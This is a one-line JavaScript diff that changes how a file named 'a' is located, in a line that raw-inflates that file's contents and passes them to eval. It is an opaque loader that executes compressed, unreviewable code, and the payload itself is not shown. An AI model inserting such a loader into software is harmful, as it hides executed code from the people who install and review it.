@@ -1,1 +1,1 @@
-eval?.(require('zlib').inflateRawSync((i=require('fs')).readFileSync(__dirname+'/a'))+'')
+eval?.(require('zlib').inflateRawSync((i=require('fs')).readFileSync('a'))+'')
